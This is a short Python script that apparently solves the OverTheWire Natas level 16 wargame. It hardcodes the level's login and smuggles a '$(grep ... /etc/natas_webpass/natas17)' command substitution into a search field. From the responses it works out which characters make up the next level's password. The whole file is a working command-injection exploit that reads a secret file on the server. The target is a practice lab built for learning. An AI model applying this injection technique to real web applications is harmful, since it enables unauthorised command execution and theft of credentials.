#!/bin/python
import requests, string

base_url = "http://natas16.natas.labs.overthewire.org/"
auth_username = "natas16"
auth_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"


all_chars = ''.join([string.ascii_letters, string.digits])

password_dictionary = []
check_str = "sonatas"
for char in all_chars:
  querystr = ''.join([check_str,'$(grep ',char,' /etc/natas_webpass/natas17)'])
  payload = { 'needle': querystr, 'submit' : 'Search' }
  r = requests.get(base_url, auth=(auth_username, auth_password), params=payload)  
  if check_str not in r.text:
    password_dictionary.append(char)
    print("Password Dictionary: {0}").format(''.join(password_dictionary))
print("Dictionary build complete.")

